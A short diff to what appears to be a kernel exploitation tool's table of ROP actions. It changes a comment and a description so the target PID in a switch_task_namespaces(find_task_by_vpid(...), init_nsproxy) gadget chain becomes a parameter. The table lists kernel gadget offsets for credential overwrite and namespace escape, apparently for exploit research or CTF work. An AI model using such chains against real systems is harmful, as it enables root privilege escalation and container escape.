@@ -32,10 +32,10 @@ rop_actions = {
             RopChainOffset(kernel_offset=0x17caa80, description="mov rax, rdi"),
             RopChainOffset(kernel_offset=0x1be550, description="commit_kernel_cred()")]),
 
-        # switch_task_namespaces(find_task_by_vpid(1), init_nsproxy)
+        # switch_task_namespaces(find_task_by_vpid(ARG_vpid), init_nsproxy)
         RopAction(
           type_id=0x03,
-          description="switch_task_namespaces(find_task_by_vpid(1), init_nsproxy)",
+          description="switch_task_namespaces(find_task_by_vpid(ARG_vpid), init_nsproxy)",
           gadgets=[
             RopChainOffset(kernel_offset=0x21f5, description="pop rdi"),
             RopChainConstant(value=1),
